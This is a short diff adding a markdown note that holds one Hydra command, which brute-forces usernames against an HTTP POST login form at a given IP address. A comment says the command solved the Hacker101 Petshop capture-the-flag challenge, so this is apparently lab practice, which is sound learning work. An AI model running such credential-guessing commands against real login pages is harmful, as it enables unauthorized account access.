@@ -1,0 +1,5 @@
+## Hydra
+
+hydra -L usernames.txt -p a -t 25 35.190.155.168 http-post-form “/2520a40289/login:username=^USER^&password=^PASS^:Invalid Username” -v
+
+# This is the snippet I used to solve hacker101 petshop.   
